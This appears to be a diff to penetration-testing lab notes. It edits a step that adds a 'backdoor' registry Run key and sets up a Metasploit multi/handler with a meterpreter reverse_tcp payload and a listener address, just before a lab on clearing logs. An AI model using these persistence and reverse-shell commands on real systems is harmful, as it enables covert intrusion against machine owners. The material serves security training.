@@ -371,8 +371,9 @@ x Personal Monitor is used for remote monitoring on a computer that includes rec
 	- ``reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe"`` `#filename.exe`
 -  Once the command is successfully executed, open another terminal window with root privileges and run **msfconsole** command.
 1. use `` exploit/multi/handler ``
-2. ``payload windows/meterpreter/reverse_tcp****set payload windows/meterpreter/reverse_tcp ``
-3. `` ``
+2. use 
+- ``set payload windows/meterpreter/reverse_tcp****set payload windows/meterpreter/reverse_tcp ``
+1. ``set lhost 10.10.1.13``
 
 # Lab 4: Clear Logs to Hide the Evidence of Compromise
 
